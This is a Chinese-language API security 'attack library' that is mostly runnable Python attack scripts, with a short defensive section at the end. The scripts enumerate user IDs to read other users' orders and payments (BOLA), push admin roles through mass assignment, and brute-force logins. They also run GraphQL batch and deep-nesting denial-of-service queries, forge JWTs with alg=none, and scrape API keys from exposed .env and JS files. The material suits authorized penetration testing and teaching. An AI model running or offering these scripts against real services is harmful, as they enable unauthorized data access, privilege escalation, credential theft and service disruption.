# API安全测试 攻击库

## 漏洞概述

现代应用程序严重依赖API(Application Programming Interface)进行数据交换和功能调用。API安全漏洞可能导致数据泄露、未授权访问、业务逻辑绕过等严重后果。本文档涵盖REST API、GraphQL API和其他API类型的常见安全问题。

**API类型**:
- REST API (最常见)
- GraphQL API
- SOAP API
- WebSocket API
- gRPC API

**常见漏洞**:
- 认证和授权缺陷
- 过度数据暴露
- 批量赋值
- 安全配置错误
- 注入攻击
- 速率限制缺失

## REST API攻击技术

### 1. BOLA (Broken Object Level Authorization)

**OWASP API Security Top 10 #1**

**原理**: API未正确验证用户是否有权访问特定对象

**场景示例**:

```http
GET /api/users/123/orders HTTP/1.1
Host: api.example.com
Authorization: Bearer user456_token
```

攻击者使用自己的令牌访问其他用户(123)的订单

**攻击脚本**:

```python
#!/usr/bin/env python3
"""
BOLA (IDOR in API) 攻击脚本
"""
import requests

def bola_attack(api_url, auth_token):
    """枚举对象ID并尝试未授权访问"""
    
    print("[*] BOLA攻击 - 枚举用户数据")
    
    headers = {
        "Authorization": f"Bearer {auth_token}",
        "Content-Type": "application/json"
    }
    
    # 枚举用户ID
    for user_id in range(1, 1000):
        endpoint = f"{api_url}/users/{user_id}/profile"
        
        try:
            r = requests.get(endpoint, headers=headers, timeout=5)
            
            if r.status_code == 200:
                data = r.json()
                print(f"[+] 用户 {user_id}: {data.get('email', 'N/A')}")
                
                # 尝试访问敏感端点
                sensitive_endpoints = [
                    f"/users/{user_id}/orders",
                    f"/users/{user_id}/payments",
                    f"/users/{user_id}/messages",
                    f"/users/{user_id}/documents"
                ]
                
                for endpoint in sensitive_endpoints:
                    r = requests.get(
                        f"{api_url}{endpoint}",
                        headers=headers
                    )
                    
                    if r.status_code == 200:
                        print(f"  [!] 可访问: {endpoint}")
            
            elif r.status_code == 403:
                # 有权限检查,但可能实现有缺陷
                print(f"[-] 用户 {user_id}: 403 Forbidden")
            
            elif r.status_code == 401:
                print("[!] Token失效")
                break
        
        except Exception as e:
            print(f"[-] 错误: {e}")
            continue

# 测试不同HTTP方法
def test_http_methods(api_url, resource_id, auth_token):
    """测试不同HTTP方法的授权检查"""
    
    methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE']
    
    headers = {"Authorization": f"Bearer {auth_token}"}
    
    for method in methods:
        endpoint = f"{api_url}/resource/{resource_id}"
        
        r = requests.request(method, endpoint, headers=headers)
        
        print(f"[*] {method} {endpoint}: {r.status_code}")
        
        if r.status_code == 200:
            print(f"  [+] {method}方法可访问!")

if __name__ == "__main__":
    api_url = "https://api.example.com"
    token = "your_auth_token_here"
    
    bola_attack(api_url, token)
    test_http_methods(api_url, 999, token)
```

### 2. 批量赋值 (Mass Assignment)

**原理**: API接受客户端提供的所有参数,未过滤敏感字段

**场景示例**:

```http
PUT /api/users/profile HTTP/1.1
Host: api.example.com
Content-Type: application/json

{
    "name": "John",
    "email": "john@example.com",
    "role": "admin",
    "is_premium": true,
    "credits": 999999
}
```

正常用户只应修改name和email,但API接受了role、is_premium等敏感字段

**攻击脚本**:

```python
def mass_assignment_attack(api_url, auth_token):
    """批量赋值攻击"""
    
    print("[*] 批量赋值攻击")
    
    headers = {
        "Authorization": f"Bearer {auth_token}",
        "Content-Type": "application/json"
    }
    
    # 正常更新
    normal_data = {
        "name": "John Doe",
        "email": "john@example.com"
    }
    
    # 尝试添加敏感字段
    sensitive_fields = {
        "role": "admin",
        "is_admin": True,
        "is_premium": True,
        "account_type": "premium",
        "credits": 999999,
        "balance": 999999,
        "permissions": ["read", "write", "delete"],
        "verified": True,
        "active": True
    }
    
    # 测试每个敏感字段
    for field, value in sensitive_fields.items():
        test_data = normal_data.copy()
        test_data[field] = value
        
        print(f"[*] 测试字段: {field} = {value}")
        
        r = requests.put(
            f"{api_url}/users/profile",
            headers=headers,
            json=test_data
        )
        
        if r.status_code == 200:
            # 验证字段是否被设置
            r = requests.get(
                f"{api_url}/users/profile",
                headers=headers
            )
            
            profile = r.json()
            
            if field in profile and profile[field] == value:
                print(f"  [+] 成功设置 {field}!")
            else:
                print(f"  [-] {field} 未被设置")
        else:
            print(f"  [-] 请求失败: {r.status_code}")

# 自动发现可修改字段
def discover_writable_fields(api_url, auth_token):
    """发现所有可写字段"""
    
    headers = {
        "Authorization": f"Bearer {auth_token}",
        "Content-Type": "application/json"
    }
    
    # 获取当前profile
    r = requests.get(f"{api_url}/users/profile", headers=headers)
    current_profile = r.json()
    
    writable_fields = []
    
    # 测试每个字段
    for field in current_profile.keys():
        # 尝试修改
        test_value = "test_value_12345"
        test_data = {field: test_value}
        
        r = requests.put(
            f"{api_url}/users/profile",
            headers=headers,
            json=test_data
        )
        
        if r.status_code == 200:
            # 检查是否被修改
            r = requests.get(
                f"{api_url}/users/profile",
                headers=headers
            )
            
            updated_profile = r.json()
            
            if updated_profile.get(field) == test_value:
                writable_fields.append(field)
                print(f"[+] 可写字段: {field}")
    
    return writable_fields
```

### 3. 过度数据暴露

**原理**: API返回比前端需要更多的数据

**场景**:

```http
GET /api/users/search?q=john HTTP/1.1
```

**响应**:
```json
{
    "users": [
        {
            "id": 123,
            "name": "John Doe",
            "email": "john@example.com",
            "password_hash": "$2a$10$...",
            "ssn": "123-45-6789",
            "credit_card": "4111-1111-1111-1111",
            "api_key": "sk_live_..."
        }
    ]
}
```

API返回了password_hash、ssn等敏感信息

**检测脚本**:

```python
def detect_excessive_data_exposure(api_url, auth_token):
    """检测过度数据暴露"""
    
    headers = {"Authorization": f"Bearer {auth_token}"}
    
    # 敏感字段关键词
    sensitive_keywords = [
        'password', 'hash', 'secret', 'token', 'api_key',
        'private_key', 'ssn', 'credit_card', 'cvv',
        'salt', 'session', 'auth', 'internal'
    ]
    
    endpoints = [
        "/api/users/profile",
        "/api/users/search?q=test",
        "/api/users/list",
        "/api/orders",
        "/api/documents"
    ]
    
    for endpoint in endpoints:
        print(f"[*] 检查: {endpoint}")
        
        r = requests.get(f"{api_url}{endpoint}", headers=headers)
        
        if r.status_code == 200:
            response_text = r.text.lower()
            
            found_sensitive = []
            
            for keyword in sensitive_keywords:
                if keyword in response_text:
                    found_sensitive.append(keyword)
            
            if found_sensitive:
                print(f"  [!] 发现敏感字段: {', '.join(found_sensitive)}")
                
                # 显示实际数据
                try:
                    data = r.json()
                    print(f"  [!] 响应示例: {str(data)[:200]}")
                except:
                    pass
```

### 4. 缺乏速率限制

**场景**: API未实施速率限制,可被暴力破解或DoS

**攻击脚本**:

```python
import threading
import time

def rate_limit_test(api_url):
    """测试速率限制"""
    
    print("[*] 测试API速率限制...")
    
    request_count = 0
    blocked = False
    
    def send_request():
        nonlocal request_count, blocked
        
        try:
            r = requests.get(api_url, timeout=5)
            request_count += 1
            
            if r.status_code == 429:  # Too Many Requests
                blocked = True
                print(f"[+] 在 {request_count} 个请求后被限制")
            
            elif r.status_code >= 500:
                print(f"[!] 服务器错误: {r.status_code}")
        except:
            pass
    
    # 快速发送大量请求
    threads = []
    for i in range(1000):
        t = threading.Thread(target=send_request)
        t.start()
        threads.append(t)
        
        time.sleep(0.01)  # 每秒100个请求
    
    # 等待完成
    for t in threads:
        t.join()
    
    if not blocked:
        print(f"[!] 未检测到速率限制! 发送了 {request_count} 个请求")
    
    return request_count

# 暴力破解测试
def brute_force_api(api_url, username):
    """暴力破解API登录"""
    
    passwords = ["password", "123456", "admin", "test"]
    
    for password in passwords:
        data = {
            "username": username,
            "password": password
        }
        
        r = requests.post(
            f"{api_url}/auth/login",
            json=data
        )
        
        if r.status_code == 200:
            print(f"[+] 密码找到: {password}")
            return password
        
        elif r.status_code == 429:
            print("[!] 被速率限制阻止")
            break
    
    return None
```

### 5. API参数污染

**原理**: 发送重复或矛盾的参数导致意外行为

**示例**:

```http
GET /api/users?id=123&id=456 HTTP/1.1
```

不同框架处理方式不同:
- 使用第一个: id=123
- 使用最后一个: id=456
- 合并为数组: id=[123, 456]

**攻击脚本**:

```python
def parameter_pollution_attack(api_url):
    """参数污染攻击"""
    
    # 测试重复参数
    test_cases = [
        # 价格操纵
        {"price": ["1000", "1"]},  # 希望使用较低的价格
        
        # ID操纵
        {"user_id": ["attacker_id", "victim_id"]},
        
        # 角色提升
        {"role": ["user", "admin"]},
        
        # 绕过过滤
        {"filter": ["blocked", "allowed"]},
    ]
    
    for params in test_cases:
        # 构造URL with重复参数
        url_parts = []
        for key, values in params.items():
            for value in values:
                url_parts.append(f"{key}={value}")
        
        test_url = f"{api_url}/endpoint?{'&'.join(url_parts)}"
        
        print(f"[*] 测试: {test_url}")
        
        r = requests.get(test_url)
        print(f"  响应: {r.status_code}")
        
        if r.status_code == 200:
            print(f"  [+] 可能成功: {r.text[:100]}")
```

## GraphQL API攻击

### 1. GraphQL Introspection

**原理**: 查询GraphQL schema获取所有可用类型和字段

**Introspection查询**:

```graphql
query IntrospectionQuery {
    __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
            ...FullType
        }
        directives {
            name
            description
            locations
            args {
                ...InputValue
            }
        }
    }
}

fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
        name
        description
        args {
            ...InputValue
        }
        type {
            ...TypeRef
        }
        isDeprecated
        deprecationReason
    }
    inputFields {
        ...InputValue
    }
    interfaces {
        ...TypeRef
    }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
    }
    possibleTypes {
        ...TypeRef
    }
}

fragment InputValue on __InputValue {
    name
    description
    type { ...TypeRef }
    defaultValue
}

fragment TypeRef on __Type {
    kind
    name
    ofType {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
            }
        }
    }
}
```

**Python脚本**:

```python
def graphql_introspection(api_url):
    """GraphQL内省查询"""
    
    introspection_query = """
    query {
        __schema {
            types {
                name
                fields {
                    name
                    type {
                        name
                        kind
                    }
                }
            }
        }
    }
    """
    
    r = requests.post(
        api_url,
        json={"query": introspection_query}
    )
    
    if r.status_code == 200:
        schema = r.json()
        
        print("[+] GraphQL Schema:")
        
        for type_def in schema['data']['__schema']['types']:
            if not type_def['name'].startswith('__'):
                print(f"\n类型: {type_def['name']}")
                
                if type_def['fields']:
                    for field in type_def['fields']:
                        print(f"  - {field['name']}: {field['type']}")
        
        return schema
    else:
        print("[-] Introspection被禁用或失败")
        return None
```

### 2. GraphQL批量查询

**原理**: 单个请求中包含多个查询,绕过速率限制

```graphql
query {
    user1: user(id: 1) { id, email, password }
    user2: user(id: 2) { id, email, password }
    user3: user(id: 3) { id, email, password }
    # ... 重复1000次
}
```

**攻击脚本**:

```python
def graphql_batch_query(api_url, max_users=1000):
    """GraphQL批量查询攻击"""
    
    # 构造批量查询
    queries = []
    for i in range(1, max_users):
        queries.append(f"user{i}: user(id: {i}) {{ id email isAdmin }}")
    
    batch_query = "query {\n  " + "\n  ".join(queries) + "\n}"
    
    print(f"[*] 发送批量查询: {max_users} 个用户")
    
    r = requests.post(
        api_url,
        json={"query": batch_query}
    )
    
    if r.status_code == 200:
        data = r.json()
        
        admin_users = []
        
        for key, user in data['data'].items():
            if user and user.get('isAdmin'):
                admin_users.append(user)
                print(f"[+] 管理员: {user['email']}")
        
        return admin_users
    else:
        print(f"[-] 批量查询失败: {r.status_code}")
        return []
```

### 3. GraphQL深度嵌套查询 (DoS)

```graphql
query {
    user {
        posts {
            comments {
                author {
                    posts {
                        comments {
                            author {
                                # ... 无限嵌套
                            }
                        }
                    }
                }
            }
        }
    }
}
```

**攻击脚本**:

```python
def graphql_depth_attack(api_url, depth=20):
    """GraphQL深度攻击"""
    
    # 构造深度嵌套查询
    query = "query { user { "
    
    fields = ["posts { comments { author { ", "} } }"]
    
    for i in range(depth):
        query += fields[0]
    
    query += "id"
    
    for i in range(depth):
        query += fields[1]
    
    query += " } }"
    
    print(f"[*] 发送深度 {depth} 的嵌套查询")
    
    import time
    start = time.time()
    
    try:
        r = requests.post(
            api_url,
            json={"query": query},
            timeout=30
        )
        
        elapsed = time.time() - start
        
        print(f"[*] 响应时间: {elapsed}秒")
        print(f"[*] 状态码: {r.status_code}")
        
        if elapsed > 10:
            print("[!] 服务器响应缓慢,可能存在DoS漏洞")
    
    except requests.Timeout:
        print("[!] 请求超时,服务器可能过载")
```

## API认证绕过

### 1. JWT令牌操纵

```python
def jwt_api_attack(api_url):
    """JWT API攻击"""
    
    import jwt
    
    # 场景1: 获取现有token
    r = requests.post(
        f"{api_url}/auth/login",
        json={"username": "user", "password": "password"}
    )
    
    token = r.json()['access_token']
    
    # 解码JWT
    decoded = jwt.decode(token, options={"verify_signature": False})
    
    print(f"[*] 原始JWT payload: {decoded}")
    
    # 修改权限
    decoded['role'] = 'admin'
    decoded['is_admin'] = True
    
    # 尝试alg=none
    none_token = jwt.encode(decoded, "", algorithm="none")
    
    headers = {"Authorization": f"Bearer {none_token}"}
    r = requests.get(f"{api_url}/admin/users", headers=headers)
    
    if r.status_code == 200:
        print("[+] alg=none攻击成功!")
    else:
        print("[-] alg=none攻击失败")
```

### 2. API Key泄露

```python
def find_api_keys(target_domain):
    """查找泄露的API密钥"""
    
    import re
    
    # 常见API key模式
    patterns = {
        'AWS': r'AKIA[0-9A-Z]{16}',
        'Google': r'AIza[0-9A-Za-z\\-_]{35}',
        'Stripe': r'sk_live_[0-9a-zA-Z]{24}',
        'Generic': r'api[_-]?key["\s:=]+([a-zA-Z0-9_-]{20,})'
    }
    
    # 检查位置
    locations = [
        f"https://{target_domain}/static/js/app.js",
        f"https://{target_domain}/config.js",
        f"https://{target_domain}/.env",
        f"https://{target_domain}/api/docs",
    ]
    
    for location in locations:
        try:
            r = requests.get(location, timeout=5)
            
            for api_type, pattern in patterns.items():
                matches = re.findall(pattern, r.text)
                
                if matches:
                    print(f"[+] 在 {location} 发现 {api_type} API Key:")
                    for match in matches:
                        print(f"    {match}")
        except:
            continue
```

## 完整API测试工具

```python
#!/usr/bin/env python3
"""
综合API安全测试工具
"""
import requests
import json
import time

class APISecurityTester:
    def __init__(self, base_url, auth_token=None):
        self.base_url = base_url.rstrip('/')
        self.auth_token = auth_token
        self.findings = []
    
    def get_headers(self):
        """获取请求头"""
        headers = {"Content-Type": "application/json"}
        
        if self.auth_token:
            headers["Authorization"] = f"Bearer {self.auth_token}"
        
        return headers
    
    def test_bola(self):
        """测试BOLA漏洞"""
        print("\n[*] 测试BOLA漏洞...")
        
        endpoints = [
            "/api/users/{id}",
            "/api/users/{id}/profile",
            "/api/users/{id}/orders",
        ]
        
        for endpoint_template in endpoints:
            for user_id in range(1, 20):
                endpoint = endpoint_template.format(id=user_id)
                url = f"{self.base_url}{endpoint}"
                
                r = requests.get(url, headers=self.get_headers())
                
                if r.status_code == 200:
                    finding = f"BOLA: 可访问 {endpoint}"
                    print(f"  [+] {finding}")
                    self.findings.append(finding)
    
    def test_mass_assignment(self):
        """测试批量赋值"""
        print("\n[*] 测试批量赋值...")
        
        sensitive_fields = {
            "role": "admin",
            "is_admin": True,
            "credits": 999999
        }
        
        for field, value in sensitive_fields.items():
            data = {field: value}
            
            r = requests.put(
                f"{self.base_url}/api/users/profile",
                headers=self.get_headers(),
                json=data
            )
            
            if r.status_code == 200:
                # 验证
                r = requests.get(
                    f"{self.base_url}/api/users/profile",
                    headers=self.get_headers()
                )
                
                if r.status_code == 200:
                    profile = r.json()
                    
                    if field in profile and profile[field] == value:
                        finding = f"批量赋值: 可设置 {field}"
                        print(f"  [+] {finding}")
                        self.findings.append(finding)
    
    def test_rate_limiting(self):
        """测试速率限制"""
        print("\n[*] 测试速率限制...")
        
        blocked = False
        
        for i in range(100):
            r = requests.get(
                f"{self.base_url}/api/test",
                headers=self.get_headers()
            )
            
            if r.status_code == 429:
                print(f"  [+] 在 {i+1} 个请求后被限制")
                blocked = True
                break
            
            time.sleep(0.1)
        
        if not blocked:
            finding = "无速率限制: 发送了100个请求未被阻止"
            print(f"  [!] {finding}")
            self.findings.append(finding)
    
    def test_data_exposure(self):
        """测试过度数据暴露"""
        print("\n[*] 测试数据暴露...")
        
        sensitive_keywords = [
            'password', 'hash', 'secret', 'token',
            'api_key', 'private'
        ]
        
        endpoints = [
            "/api/users/search?q=test",
            "/api/users/list"
        ]
        
        for endpoint in endpoints:
            r = requests.get(
                f"{self.base_url}{endpoint}",
                headers=self.get_headers()
            )
            
            if r.status_code == 200:
                response_text = r.text.lower()
                
                found = [kw for kw in sensitive_keywords if kw in response_text]
                
                if found:
                    finding = f"数据暴露 in {endpoint}: {', '.join(found)}"
                    print(f"  [!] {finding}")
                    self.findings.append(finding)
    
    def run_all_tests(self):
        """运行所有测试"""
        print(f"[*] 开始API安全测试")
        print(f"[*] 目标: {self.base_url}\n")
        
        self.test_bola()
        self.test_mass_assignment()
        self.test_rate_limiting()
        self.test_data_exposure()
        
        print(f"\n[*] 测试完成")
        print(f"[*] 发现 {len(self.findings)} 个问题")
        
        return self.findings

# 使用
if __name__ == "__main__":
    tester = APISecurityTester(
        base_url="https://api.example.com",
        auth_token="your_token_here"
    )
    
    findings = tester.run_all_tests()
    
    # 保存报告
    with open("api_security_report.json", "w") as f:
        json.dump(findings, f, indent=2)
```

## 防御措施

### 1. 对象级别授权

```python
def check_authorization(user_id, resource_id):
    """检查用户是否有权访问资源"""
    
    resource = get_resource(resource_id)
    
    if not resource:
        raise NotFoundError()
    
    if resource.owner_id != user_id:
        raise ForbiddenError()
    
    return resource
```

### 2. 输入验证

```python
from pydantic import BaseModel, validator

class UserUpdate(BaseModel):
    name: str
    email: str
    
    # 不包含敏感字段如role、is_admin等
    
    @validator('email')
    def validate_email(cls, v):
        # 邮箱验证逻辑
        return v
```

### 3. 速率限制

```python
from flask_limiter import Limiter

limiter = Limiter(
    app,
    key_func=lambda: request.headers.get('Authorization'),
    default_limits=["100 per hour"]
)

@app.route('/api/resource')
@limiter.limit("10 per minute")
def get_resource():
    return jsonify({"data": "..."})
```

### 4. GraphQL深度限制

```python
from graphql import GraphQLError

def depth_limit_validator(max_depth):
    def validate(context, document):
        # 计算查询深度
        depth = calculate_depth(document)
        
        if depth > max_depth:
            raise GraphQLError(
                f"查询深度{depth}超过最大限制{max_depth}"
            )
    
    return validate
```

## 参考资源

- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [REST API Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html)
- [GraphQL Security](https://graphql.org/learn/best-practices/#security)

---

**最后更新**: 2025-11-16
**适用场景**: REST API、GraphQL API、WebSocket API等各类API
**攻击难度**: 简单到中等
**检测难度**: 需要理解API设计和业务逻辑
